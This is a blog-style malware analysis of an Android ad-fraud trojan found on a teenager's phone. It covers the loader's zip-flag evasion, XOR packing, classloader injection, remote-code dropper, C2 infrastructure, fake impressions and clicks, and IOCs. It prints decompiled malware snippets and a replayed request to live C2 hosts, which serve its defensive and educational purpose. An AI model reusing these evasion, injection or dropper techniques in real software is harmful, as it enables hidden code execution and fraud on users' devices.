---
layout: default
title: Trivial malware found on my brother's device
---


My little brother is deep into modded games. If there's a build of a game with unlimited coins, unlocked skins, or a god-mode menu floating around the internet, he has it installed within the hour. His source is one of those third party "mod" stores that promise every paid game for free. I've told him a hundred times that nothing is free and the store itself is the product being sold, but he's thirteen and the mods work, so the lecture never lands.

Last week he tells me his phone (a Vivo V2333) is "acting up". Battery dead by afternoon. The browser randomly opening promo pages. Every so often a full screen notification that just says "Warning" with an OK button. He figured the phone was dying. I figured otherwise, plugged it in over adb, and started pulling threads.

Five hours later I had cracked two packers with a python script, mapped a command and control network spread across four countries, replayed the malware's own API handshake from my laptop, and downloaded the second stage payload straight off their CDN. This is the writeup.

## The triage

First pass was the usual spyware checklist. Accessibility services: none. Device admins: none. Notification listeners: Android Auto, the stock launcher, vivo's push service, all normal. Input methods: just Gboard. No su, no Magisk. The network log (the phone was routed through my proxy at the time) was all TikTok, Snapchat, Google, Discord and food delivery telemetry. Boring.

Then the third party package list:

```
$ adb shell pm list packages -3
...
com.zddapps.totke
...
```

"Totke" is Urdu for home remedies. A tips app. Except:

```
$ adb shell cmd package resolve-activity --brief \
    -a android.intent.action.MAIN -c android.intent.category.LAUNCHER com.zddapps.totke
No activity found
```

A content app you cannot open. No icon, no launcher entry, five months on the device (sideloaded 2025-05-10 through the package installer), holding `SYSTEM_ALERT_WINDOW`, `USE_FULL_SCREEN_INTENT`, `FOREGROUND_SERVICE`, `WAKE_LOCK` and media read permissions. That combination has no innocent explanation. I pulled the APK.

## Layer 1: the zip that gaslights your tools

```
$ unzip totke.apk
skipping: classes.dex   unable to get password
```

APKs don't have passwords. What's going on is dumber and more effective:

```python
for i in zipfile.ZipFile('totke.apk').infolist():
    print(i.filename, hex(i.flag_bits))

# classes.dex                   flag=0x0001
# assets/7824666281827897010    flag=0x0001
# (every single entry)
```

Bit 0 of a zip entry's flags means "encrypted". The data is not encrypted. Android's installer ignores the flag and reads everything fine, but `unzip`, python's zipfile, and most APK analysis tooling honors it and refuses to touch the contents. One flipped bit and the automated pipeline bounces off before it ever sees code. If you've ever wondered how junk like this shows "0 engines detected", this is part of the answer.

Getting around it is thirty seconds of work. Parse local file headers yourself, ignore the flag, inflate:

```python
import struct, zlib

data = open('totke.apk','rb').read()
pos = 0
while True:
    i = data.find(b'PK\x03\x04', pos)
    if i < 0: break
    (sig, ver, flags, method, mt, md, crc, csize, usize, nlen, elen) = \
        struct.unpack('<IHHHHHIIIHH', data[i:i+30])
    name = data[i+30:i+30+nlen].decode()
    cdata = data[i+30+nlen+elen : i+30+nlen+elen+csize]
    raw = zlib.decompress(cdata, -15) if method == 8 else cdata
    ...
    pos = i + 4
```

Inside: a `classes.dex` of 7.8 KB and a 2.1 MB asset named `7824666281827897010` with an entropy of 7.9999 bits per byte. A 7.8 KB dex is not an app. It's a loader, and the asset is the real payload. Encrypted. Or "encrypted". Hold that thought.

## Layer 2: the stub, and the worst crypto I've cracked this year

The stub is eight classes under `iltoj.iik`. The `Application` subclass:

```java
public final class Cx extends Application {
    protected void attachBaseContext(Context context) {
        vJ = context;
        this.FNLCv.run();                                 // decrypt + inject
        super.attachBaseContext(pyLoA.FNLCv.vJ(context)); // swap in wrapped ctx
    }
}
```

`attachBaseContext` runs before anything else in an app, so the payload is live before `onCreate()` would normally fire. The class names are obfuscated and the string literals are scrambled with a toy XOR routine padded with junk calls (`System.nanoTime()`, `Locale.getDefault()`) to make the control flow look busy. Cleaned up, `FNLCv.<init>` is a classloader patch:

```java
Field f1 = Class.forName("dalvik.system.BaseDexClassLoader").getDeclaredField("pathList");
Object pathList = f1.get(context.getClassLoader());
Field f2 = pathList.getClass().getDeclaredField("dexElements");
Object elements = f2.get(pathList);                       // Element[]
Object bigger = Array.newInstance(elementClass, length + 1);
// copy old elements over, then:
Array.set(bigger, length, newElement);                    // append ours
f2.set(f1.get(context.getClassLoader()), bigger);
```

It grows the running classloader's `dexElements` array by one slot and drops its own element in. No new `DexClassLoader`, no child process, nothing in a normal location on disk. The payload becomes part of the host app's own classloader, so anything inventorying loaded classes per process just sees "the app". The chain of four nested try/catch blocks constructing that `Element` is constructor-signature fallbacks across Android versions, which tells you this kit has been maintained for a while.

And the 2.1 MB blob's encryption? Complete listing:

```java
byte[] bArr2 = new byte[i];
new Random(7824666281827962545L).nextBytes(bArr2);
for (int i2 = 0; i2 < i; i2++) {
    bArr[i2] = (byte) (bArr[i2] ^ bArr2[i2]);
}
```

XOR against a `java.util.Random` keystream with a hardcoded seed. Java's `Random` is a 48 bit linear congruential generator. Given the seed, the whole keystream is predetermined forever:

```
seed <- (seed ^ 0x5DEECE66D) & (2^48 - 1)
next(bits): seed <- (seed * 0x5DEECE66D + 0xB) & (2^48 - 1); return seed >> (48 - bits)
```

`nextBytes` pulls `next(32)` per int, four bytes little endian per int. Python:

```python
class JRandom:
    def __init__(self, seed):
        self.s = (seed ^ 0x5DEECE66D) & ((1 << 48) - 1)
    def next(self, bits):
        self.s = (self.s * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)
        return self.s >> (48 - bits)
    def next_bytes(self, n):
        out = bytearray(n); i = 0
        while i < n:
            rnd = self.next(32)
            for _ in range(min(n - i, 4)):
                out[i] = rnd & 0xFF; rnd >>= 8; i += 1
        return bytes(out)

blob = open('blob.bin','rb').read()
dec = bytes(a ^ b for a, b in zip(blob, JRandom(7824666281827962545).next_bytes(len(blob))))
```

```
>>> dec[:11]
b'PK\x03\x04\x14\x00\x08\x08\x08\x00\x82p'
```

A zip containing one file: `classes.dex`, 5.8 MB. Hello, real app.

## Layer 3: what the payload is

About 3,600 classes. The package names introduce themselves: `com.adcommercial`, `com.adsdk`, `com.nextg`, `com.gnet`, and a fake `in.inmobi` package (InMobi is a real ad network; this one is camouflage). The app names itself in its own config request:

```
GET http://<c2>/client.config/?app=pndr2&format=json&uid=...&version=65.7
```

So the family name is pndr2. The behavior inventory, piece by piece.

### Living invisibly

The payload wraps the real application context in a fake SDK wrapper (`in.inmobi.sdk.App`), so its logic runs as the app's own. It starts a foreground service (`EYMSI`), which Android requires to show a notification. It shows one with a channel literally named `" "` and a 1x1 transparent pixel for an icon. Technically compliant, practically invisible. A scheduled task fires every 5 seconds, a repeating `AlarmManager` revives the service every 10 minutes, and there is deliberately no `BOOT_COMPLETED` receiver: after a reboot it relies on FCM high priority messages and the alarm chain instead. Fewer manifest entries, less to grep for.

### Ads nobody sees

```java
// com/adcommercial/utils/sWU.java
Display d = virtualDisplayManager.createVirtualDisplay("ad", 1, 1, ...);
new Presentation(context, d).show();
```

A one-pixel `VirtualDisplay` with a `Presentation` on it. Ads render off screen. The ad SDK counts an impression, somebody invoices for it. There's also a transparent `Activity` that swallows touches and immediately `moveTaskToBack()`s itself. To know when it can get away with visible things, it plants a 1x1 `TYPE_APPLICATION_OVERLAY` window and watches it, and it checks screen state before firing anything. The ads prefer to happen when you're not looking.

### The fake incoming call

This one I admired out loud. Modern Android heavily restricts background apps from launching UI. pndr2's workaround: register your own `ConnectionService` with the Telecom framework, then call yourself:

```java
// com/adcommercial/utils/connect/oTCC.java
telecomManager.addNewIncomingCall(phoneAccountHandle, extras);
```

An incoming call is one of the most privileged UI events in Android. The system grants foreground privileges, wakes the screen, lets the associated app surface UI, because a phone that can't show you a call is a bad phone. Except there is no call. There's an ad. My brother's phone had been "ringing" with nobody on the line, and by the time he picked it up, the notification was already there. That was his "Warning" notification.

### The consent screen that isn't

An activity shows fake terms, overrides `onBackPressed` to do nothing, and re-launches itself if you dismiss it, until you grant "Display over other apps". It carries a hardcoded MIUI-specific settings path next to the stock Android one. That permission is the business model: with it, the ad windows float over everything.

### Spam with working hours

FCM messages with `show_notification=yes` post system-warning-styled notifications that open server supplied URLs, some as full screen intents (the mechanism reserved for alarms and calls). If the C2 goes quiet, the app generates its own ad notifications locally, hourly, between 09:00 and 22:00. Daytime only, when you'll plausibly fat-finger one. It also tries to pin a home screen widget and reports success to its tracker, and it force-opens the browser at a push-subscription scam URL with the device id attached.

### Paranoia

Emulator checks on Build fields and hardware strings, and it plays dead on any exception. A security patch date gate at 2023-08-31 changes behavior on patched devices, because some of its overlay tricks died in patches and it knows. A `PackageGhost` class spoofs the app's identity toward ad SDKs, picking which name to wear by walking the call stack to see who's asking, and if the C2 rotates the expected package name, the app wipes its own data directories and kills itself. It also drags in LSPatch's `HiddenApiBypass` so all this reflection keeps working on newer Android.

## The dropper

Then the part that made me sit up:

```java
// sdk/oTCC.java
File f = HttpUtility.downloadScrambledFile(config.sdkLink);   // config field "su"
byte[] raw = ouRw.pyLoA(f);          // de-XOR, Random seeded 1661128
// -> InMemoryDexClassLoader, spliced into dexElements
// -> Class.forName("com.applovin.impl.EnterPoint").newInstance()
```

The server config carries a URL to another scrambled bundle (same toy XOR, seed `1661128`), downloaded, decrypted in memory, injected into the live process, entered through a class disguised with AppLovin's name. The operator can ship arbitrary new code to every infected phone at any time. No APK install, no Play Protect scan, no prompt. Whatever this thing is today, it can be something else tomorrow. Hold that thought too, it becomes the point later.

## Who's on the other end

Before touching the second stage I wanted the infrastructure. The stage-1 code and the live config coughed up a domain family, and the public records told the rest.

**Control side.** `api.jetengine.be` (registered 2016, servers.com Amsterdam) is an nginx front with a JSON catch-all: every path returns HTTP 200 with `{"code":404,"message":"Not found"}`, so you can't enumerate endpoints. `one.trymyconf.com` (2020, Hetzner Nuremberg) and `ssp.atswe.xyz` (2020, NameCheap, Hetzner) both answer with Go's stock `net/http` 404 page, so the backends are Go. Neither domain has ever had a TLS certificate. HTTP-only command and control, in 2026. Certificate transparency also coughed up the backup cluster baked into the binary: `upyourphone.me`, `threetwoonefire.com`, `cryptonomiconf.me`, `shannksara.com`, all live.

**Money side.** `razkondronging.com` (keyboard-mash domain, 2024, NameCheap, hiding behind Cloudflare) 302s to `topofpopstar.com` (2024, registered at the same Bahamas registrar as trymyconf, on OVH in France) which lands on `izy0.com` (2020, NameCheap, Cloudflare), an established traffic distribution system whose campaign pages were passing through public URL scanners two days before I checked. They don't run the scam landing pages themselves. They sell the redirect traffic into a TDS. The shared offshore registrar ties both clusters to the same operator.

Sloppy? Extremely. Plain HTTP at every hop, hardcoded crypto seeds twice, a config endpoint that hands publisher credentials to anyone who asks politely. And yet: zero listings on URLhaus or ThreatFox, no public reporting anywhere I could find. Five plus years of operation. The opsec isn't in the crypto, it's in staying small and making scanners choke on a zip flag.

## Is the campaign still breathing

All four domains resolve. The event tracker answers with a current timestamp. The push-registration domain 302s into the TDS with fresh IP-signed parameters generated for my request seconds earlier. Yes, breathing.

The stage-1 config poll (`/client.config/?app=pndr2`) answered my probes with HTTP 200 and an empty body, on every domain, no matter what I fed it. Either it only serves targeted geographies and my IP isn't one, or it wants something else in the request. I never found out, because I didn't need stage 1 anymore.

## Replaying the client

Here's the thing about a static config chain: every parameter the app sends has to exist in the binary. So I went shopping in the decompiled code.

The `advert_key` the server validates is hardcoded in `BuildConfig` (base64 of a hex string). The primary domain isn't the SDK domain, it's `one.trymyconf.com`, with the backup list base64'd into `BuildConfig.domain_reserved`. The device id is just MD5 of the Android ID, any 32 hex chars do. The interesting one was the last suffix: the app reads its own APK tail, locates the `"APK Sig Block 42"` marker, and extracts a custom attribute the distribution channel appended at signing time:

```python
data = open('totke.apk','rb').read()
i = data.rfind(b'APK Sig Block 42')
ln  = struct.unpack('<H', data[i-10:i-8])[0]
off = struct.unpack('<I', data[i-14:i-10])[0]
print(data[off:off+ln].decode())
```

```
&utm_source=3azadbHXCfPnAEUdb7ZPixY5iToY5D6GDQxJbj5NCeQ655RmMSXPJS7T3KsCMhnS19wQ...
```

A 272 byte campaign token. The mod store didn't just drop the malware; it gets paid per install, cryptographically accounted for, and every config poll carries the receipt.

Assembling the full replica request (`advert_key`, uid, version, package, build fields, fcm token, telephony params, the utm token, first-install flag) still got me empty bodies from stage 1. But reading further down the init chain, the SDK stage (`v1/config`) doesn't wait for stage 1 at all if you know where to point it, and I did:

```
GET http://api.jetengine.be/v1/config?pkg=com.zddapps.totke&uid=<md5>&av=34&sv=65.7
    &adk=<advert_key>&rn=0&check_rnd=<ts>&s=2
```

The server answered instantly with the full live config. And there it was:

```json
{
  "su": "http://cdn.jetengine.be/dwnl/52fa91a0d8a16e3e8a3ee9ea606480fa.pict",
  "sh": "52fa91a0d8a16e3e8a3ee9ea606480fa",
  "log": "http://logs.jetengine.be",
  "event_listener": "http://events.jetengine.be",
  "partners": [ ...6 ad network accounts with placement tokens... ],
  "iap": { "crt": "505f551c4a5657...", "pm": "0201095c15...", ... }
}
```

`su`, the second stage URL, served to a curl. I never touched anything beyond a GET the app itself makes. They left the door open; I just read the sign above it.

## Stage 2: the download

The `.pict` is 17.9 MB, served off `cdn.coffeefeedscf.com` (another domain for the pile), scrambled with the same Random-XOR scheme, seed `1661128`:

```
>>> dec[:11]
b'PK\x03\x04\x00\x00\x00\x00\x08\x00!\x08!\x02\x00'
```

A full APK. 30 MB unpacked, four dex files, and native libs that give the game away: `libapplovin-native-crash-reporter.so`, Pangle's `libnms.so` and `libpglarmor.so`. Pangle is TikTok's ad network. This thing ships real, legitimate ad SDKs inside the malware.

## Stage 2: the engine

The fake-named entry class (`com.applovin.impl.EnterPoint`) builds one adapter per network id from the `partners` config. Mapping the live config's tokens to the code:

| id | Network | What the token is |
|----|---------|-------------------|
| 5 | "Lynx" private DSP | exchange unit key |
| 8 | UnityAds | game id |
| 10 | AppLovin MAX | SDK key |
| 13 | Chartboost | app id |
| 15 | Mintegral | appId/appKey |
| 26/34 | Vungle | app ids |
| 29 | Pangle | app id 8382178 |
| 48 | Bigo | app id |
| 49 | AdMob | |
| 54 | Fyber FairBid | app id 215105 |

Those are the operator's own publisher accounts, served to every infected phone by the config. On a five second heartbeat the engine loads fullscreen interstitials under these accounts and "shows" them on the invisible surfaces from stage 1, timed to when the screen state looks human. SDK impression callbacks fire, revenue accrues to accounts nobody at Unity or AppLovin has ever looked at twice. Every event is POSTed back home: `report/shown`, `report/click`, `report/revenue` with the network's own per-impression payout fields, so the operator watches the earnings live.

The Lynx path is the aggressive one. It POSTs a device fingerprint to a private exchange (`ssp.thild.info`), gets back an ad markup plus a win-notice URL, fires the win notice (that's the fake impression) and then force-opens the advertiser's landing page in Chrome with a fabricated impression id. That's the fake click. No human touched anything at any point.

After more than two click callbacks the process kills itself. Self ratelimiting, so the fraud curves stay pretty.

## The `iap` blobs, or how to wear another app's skin

The `iap` object in the config is hex strings, and the decoder turned out to be a joke I should have seen coming: XOR with the lowercased spoofed package name. The key was literally `com.zddapps.totke`:

```
al  -> "टोटके"                      (app label, Hindi for "Totke")
fsh -> SHA-256 of some APK
crt -> a DER X.509 cert, self-signed, CN=mstore, L=Delhi, C=IN, valid 2013-2035
pm  -> a full permission list
vn  -> versionName "2.7a", vk -> 17, vm -> minSdk 21, vt -> targetSdk 34
```

Then `PackageManagerExtension`, a full PackageManager proxy, answers the ad SDKs' identity questions with these values. `getInstallerPackageName()` returns `com.android.vending`. The signing cert query returns the Delhi cert. The label query returns टोटके. `PackageGhost` stack-walks to figure out whether GMS or a WebView is asking before answering. Net effect: every ad network SDK believes it's running inside a genuine, Play Store installed, Hindi tips app signed with that certificate. The config ships the disguise; the engine wears it.

The Delhi cert and the Hindi label are a nice hint about where this campaign's primary distribution actually is. My brother's install looks like a recycled build that wandered into a different channel.

## "Stage 3": the plugin trick, and what it isn't

The downloaded APK declares 74 activities, all belonging to the bundled ad SDKs (Unity's AdUnitActivity, Chartboost's CBImpressionActivity, AppLovin's fullscreen activity, Fyber's stuff). The problem: you can't launch an activity that isn't in the host manifest. Solution: an Instrumentation proxy.

`zWjKtEaM` replaces `ActivityThread.mInstrumentation` by reflection, so every activity launch in the process passes through its `execStartActivity` overrides. If the target class is in the plugin's manifest and not in the host's, the intent is rewritten to a stub activity (`com.applovin.adview.AppLovinFullscreenActivity`), with the real class stashed in an extra; `newActivity` swaps it back at construction time, and `callActivityOnCreate` patches the activity info so theme and orientation render right. Textbook plugin framework.

I checked the scope carefully because this exact mechanism is how you'd build universal phishing overlays. It can't do that: the rewrite only fires for classes the plugin itself declares, and the redirect target is always a stub inside the host package. It watches every launch process-wide, but nothing in the code logs or abuses that. And there's no fourth download anywhere: the only file stage 2 ever touches is the same `.pict` on disk. The "stage 3" is the stage-2 file wearing its plugin hat.

## What they take from the device

Honest inventory, grep-verified across both stages, fraud code only (the bundled ad SDKs have their own telemetry habits, which is their own GDPR problem):

**What leaves the phone:**

- Device identity: MD5(Android ID) on every call, plus the raw Android ID to the Lynx DSP, plus GAID
- The FCM token, which is what gives the operator remote push reach into the device
- APK signing cert digest and the installer campaign tag
- Build release, manufacturer, model, OS version
- SIM operator name, network operator name, SIM and network ISO country codes
- VPN interface detection (it literally enumerates interfaces for `tun0`/`ppp0`)
- Network type, default browser package and version
- Screen on/off state, notification permission state, process uptime, emulator flag
- Full Java stack traces on any internal exception (free QA, shipped to `logs.jetengine.be`)
- Per-ad revenue accounting back to the C2

**What doesn't:** no contacts, no SMS, no call log, no accounts, no clipboard, no mic, no camera, no photo or file enumeration, no accessibility abuse, no browsing history, no GPS coordinates. The installed-app checks are local-only (default browser detection) though the result does get shipped to the DSP. `PackageManagerExtension` passes through every query that isn't about the spoofed identity; the installed-app list never leaves.

So no, it's not reading his messages. But I'm deliberately not calling it "just" anything, because of the dropper. The code I audited is the code that was served this week. The channel that delivers next week's code is still live, still plain HTTP, and still one config edit away from a different payload with a different appetite. The phone's job in this network is to be a ghost impression farm; what it could be asked to become is the uncomfortable part, and I'd rather say that plainly than file the whole thing under "harmless".

## IOCs

| What | Value |
|---|---|
| Package | `com.zddapps.totke` (versionName 65.7) |
| Family string | `app=pndr2` in `/client.config/` |
| Stage-1 C2 | `one.trymyconf.com`, backups: `g3.shannksara.com`, `one.upyourphone.me`, `one.threetwoonefire.com`, `one.cryptonomiconf.me` |
| Stage-2 API / log / events / CDN | `api.jetengine.be`, `logs.jetengine.be`, `events.jetengine.be`, `cdn.jetengine.be` |
| Stage-2 download host | `cdn.coffeefeedscf.com` |
| Private DSP | `ssp.thild.info` |
| Push-subscription monetization | `push.razkondronging.com` |
| Event tracker | `ssp.atswe.xyz` |
| Redirect chain (live) | `razkondronging.com` → `topofpopstar.com` → `izy0.com` |
| Advert key (base64) | `ZWMwMDBhMDg4ZTAwNDA1NTAwMDA0MDY2MDA0MDY2MDA0MDY2MGU4NzZkOWNkYQ==` |
| Packer blob seed | `7824666281827962545` (java.util.Random XOR) |
| Dropper payload seed | `1661128` (same scheme) |
| `iap` blob XOR key | the spoofed package name |
| Spoofed cert | self-signed, `CN=mstore, L=Delhi, C=IN`, serial `134AF86A` |
| Install attribution | `@injseq...$$` marker + utm token in APK signing block tail |
| Disguise packages | `in.inmobi.*`, `com.applovin.impl.*` |
| Stage-2 entry | `com.applovin.impl.EnterPoint` |
| Foreground service | `iltoj.iik.EYMSI` (1px icon, channel `" "`) |
| Forensics on-device | `getDir("extra")/<md5>.pict`, prefs keys `d_list_index`, `ITIME` |

Everything above talks plain HTTP. A pi-hole or a DNS log catches this family cold.

## Cleanup, and the actual lessons

On his phone: the trojan, the mod store it rode in on, and the rest of the grey junk all got uninstalled. Overlay and notification permissions re-audited, accessibility and device admins re-verified empty, keyboards checked. The one thing I can't undo is five months of whatever the dropper delivered and whatever got typed into pages it opened, so credentials were rotated anyway.

As for my brother: the mods are gone, the lecture finally landed, and he's been telling his friends the games "hacked the phone". He's telling it wrong, but the conclusion is right, so I'm letting it stand.

The lessons, for the four people who read to the end:

1. The mod store is not a store. It's an affiliate program where the product is your kid's phone, with cryptographic per-install accounting.
2. `pm list packages -3` and thirty seconds per app beats any antivirus. No launcher activity on a "content app" is a guilty verdict by itself.
3. "Display over other apps" is a root-adjacent permission. Audit it.
4. A live, unauthenticated, plain-HTTP code-download channel means the verdict on a family has an expiry date. Write it with a date stamp.
5. The packer crypto was a joke and the zip flag was a gimmick, and together they still defeated every automated tool that touched the file. Malware doesn't need to beat analysts. It needs to beat pipelines.
